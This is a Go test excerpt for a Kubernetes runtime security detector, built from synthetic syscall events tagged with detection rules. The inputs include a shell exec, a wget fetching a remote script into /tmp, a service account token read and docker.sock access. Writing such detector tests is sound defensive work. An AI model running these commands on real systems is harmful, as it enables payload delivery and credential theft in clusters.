...
func TestProcessRuntimeEvent_EventFactSignalChain_StatelessDetectors(t *testing.T) {
	...
	inputs := []RuntimeEventInput{
		...
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "execve", TargetPath: "/bin/sh -c id", Timestamp: &now},
		// TMP_BINARY_EXECUTION + REMOTE_PAYLOAD_FETCH
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "execve", TargetPath: "/tmp/wget http://x/p.sh -O /tmp/p.sh", Timestamp: &now},
		// SERVICEACCOUNT_TOKEN_READ
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "openat", TargetPath: "/var/run/secrets/kubernetes.io/serviceaccount/token", Timestamp: &now},
		// EXTERNAL_EGRESS
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "connect", TargetPath: "dst=8.8.8.8:53 proto=udp dport=53", Timestamp: &now},
		// HOST_PATH_ACCESS
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "open", TargetPath: "/var/run/docker.sock", Timestamp: &now},
	}
